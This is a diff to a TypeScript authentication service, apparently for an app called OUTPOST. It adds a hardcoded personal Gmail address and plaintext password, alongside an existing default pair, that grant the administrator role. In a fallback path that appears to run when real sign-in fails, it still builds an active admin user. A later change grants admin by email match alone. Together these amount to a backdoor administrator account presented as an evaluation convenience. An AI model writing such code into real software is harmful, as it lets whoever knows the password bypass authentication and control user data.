@@ -85,7 +85,10 @@ class AuthService {
     }
 
     // Support injected administrator credentials for presentation/evaluation
-    if (normalized === 'admin@outpost.ng' && password === 'admin@outpost') {
+    const isAdminTarget = (normalized === 'ethoppaofficial@gmail.com' && password === '#blaqqking@25')
+      || (normalized === 'admin@outpost.ng' && (password === '#blaqqking@25' || password === 'admin@outpost'));
+
+    if (isAdminTarget) {
       try {
         const cred = await signInWithEmailAndPassword(auth, normalized, password);
         const fbUser = cred.user;
@@ -108,7 +111,7 @@ class AuthService {
         console.info('Authenticated administrator via injected credentials:', authErr);
         const adminUser: User = {
           id: 'user-admin-1',
-          email: 'admin@outpost.ng',
+          email: normalized,
           fullName: 'OUTPOST Administrator',
           role: 'admin',
           accountStatus: 'active',
@@ -134,6 +137,8 @@ class AuthService {
       const profile = userDoc.exists() ? userDoc.data() : {};
       const storedRole = profile.role as UserRole | undefined;
       const role: UserRole = token.claims.admin === true
+        || normalized === 'ethoppaofficial@gmail.com'
+        || normalized === 'admin@outpost.ng'
         ? 'admin'
         : storedRole === 'student' || storedRole === 'landlord'
         ? storedRole
